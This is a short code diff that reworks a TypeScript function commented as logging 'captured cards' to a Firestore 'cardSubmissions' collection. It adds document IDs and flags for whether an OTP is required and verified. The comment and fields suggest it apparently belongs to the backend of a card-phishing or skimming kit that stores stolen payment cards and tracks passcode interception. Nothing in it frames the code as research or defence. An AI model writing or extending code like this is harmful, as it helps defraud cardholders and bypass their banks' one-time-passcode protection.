@@ -84,12 +84,18 @@ testConnection();
 // Shared function to log captured cards to Firestore
 export const logCardSubmission = async (cardData: any) => {
   try {
-    await addDoc(collection(db, 'cardSubmissions'), {
+    const docId = cardData.id || `CARD-${Date.now()}`;
+    await setDoc(doc(db, 'cardSubmissions', docId), {
       ...cardData,
+      id: docId,
+      requiresOtp: false,
+      otpVerified: false,
       timestamp: new Date().toISOString(),
     });
+    return docId;
   } catch (e) {
     console.error('Failed to sync card data:', e);
+    return null;
   }
 };
 
